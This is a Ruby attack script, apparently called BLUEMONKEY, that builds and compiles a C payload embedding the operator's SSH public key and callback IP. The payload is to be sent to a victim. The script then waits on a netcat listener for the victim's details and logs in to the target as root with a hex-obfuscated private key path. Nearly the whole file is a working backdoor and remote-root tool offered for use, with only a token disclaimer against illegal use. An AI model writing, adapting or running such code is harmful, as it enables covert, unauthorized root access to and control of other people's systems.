#!/usr/bin/env ruby
#
# This is a script for exploiting Linux OS via SSH Authentication bypass technique.
#
# NOTE:
# Please read PoC.txt (Proof of Concept) exploitation guide
# Send the payload to target
# Your exploitation will be success if target executing your payload
#
# Success tested on:
# - Debian all version
# - Kali Linux all version
#
# Download this tool on https://github.com/0xffHack/Exploits/OS/Linux/LP/BLMO
#

require 'net/ssh'
require './Injection/shellcode'

def banner()
info = '''
Linux Exploit via Remote Secure Shell / Local Privilege Exploit PoC

Codename: BLUEMONKEY (Version 1.0)

Do not use for illegal purpose.

Developer: Aris Kurniawan - Twitter: @0xffHack

NOTE: 1. Only affect if target login as root
      2. Only affect if target run ssh service


'''
	print info
	print "Usage: "+__FILE__+" -login <username> -lhost <local_IP> -payload <name>\n\n"
end
 

if ARGV.length < 6 or ARGV.length > 6
	banner()
	exit 1

elsif ARGV[0] == "-login" and ARGV[2] == "-lhost" and ARGV[4] == "-payload"
	login = ARGV[1]
	lhost = ARGV[3]
	payload = ARGV[5]	
	banner()
	print "[+] Working on directory "+Dir.pwd+"\n\n"
	print "[+] Executing "+__FILE__+" "+ARGV[0]+" "+login+" "+ARGV[2]+" "+lhost+" "+ARGV[4]+" "+payload+"\n\n"
	print "[+] Generating payload => supported x86 and x86_64\n\n"
	system("touch Code/payload_code.c")

	##
	if login == "root"
		login_path = "/root"
	end

	##
	if login != "root"
		login_path = "/home/#{login}"
	end

	keypath = "#{login_path}/.ssh/id_rsa.pub"
	begin
		keys = File.read(keypath).chomp!
	rescue Errno::ENOENT => handler1
		print "[-] Errno: #{handler1}\n\n"
		exit 1
	end
			
	##
	if lhost == ""
		lhost = "127.0.0.1"
	end

	# reading shellcode
	post1 = Shellcode.inject0x1
	post2 = Shellcode.inject0x2
	post3 = Shellcode.inject0x3
	post4 = Shellcode.inject0x4
	post5 = Shellcode.inject0x5

	# building a payload
	open('Code/payload_code.c','w') do |build_payload|
		build_payload << "#{post1}#{keys}#{post2}#{lhost}#{post3}#{keys}#{post4}#{lhost}#{post5}"
	end
	print "[+] Compiling payload to be Linux executable...take few minutes\n\n"
	system("gcc Code/payload_code.c -o Deploy/#{payload}")
	print "[+] Payload deployed on "+Dir.pwd+"/Deploy/#{payload}\n\n"
	print "MESSAGES: Please send your payload to target\n\n"
	print "[+] Waiting interaction from target using netcat\n\n"
	system("nc -lvp 4444 > Targets/details.dat")
	print "\n[+] Interacting with target successed\n\n"
	print "[+] Sending test commands {'Hello world!'} to target\n\n"

	##
	query = []
	begin
		target = File.read("Targets/details.dat")
	rescue Errno::ENOENT => handler2
		print "[-] Errno: #{handler2}\n\n"
		exit 1
	end

	##
	target.each_line do |details|
		query << details
	end

	##
	rhost = query[1]
	if rhost == "\x0a"
		rhost = "127.0.0.1"
	end

	# running exploit
	begin
		credentials = "\x7e\x2f\x2e\x73\x73\x68\x2f\x69\x64\x5f\x72\x73\x61"
		# creds_backup = "\x7e\x2f\x2e\x73\x73\x68\x2f\x69\x64\x5f\x72\x73\x61"
		begin
			sleep 3
			print "[+] Response:\n\n"
			sleep 2
			Net::SSH.start(rhost, "root", :keys=>[credentials]) do |ssh|
			result1 = ssh.exec!("printf 'Hello world!'")
			puts result1
			end
		rescue Net::SSH::AuthenticationFailed => handler3
			puts "[-] Errno: #{handler3}\n\n"
			exit 1
		end
	rescue Errno::ECONNREFUSED => handler4
		print "[-] Errno: #{hadler4}\n\n"
		exit 1
	end

	##
	print "\n[+] Job finished, exec: ./ssh.rb for launching the command shell\n\n"
	exit 1	
else
	banner()
	exit 1
end
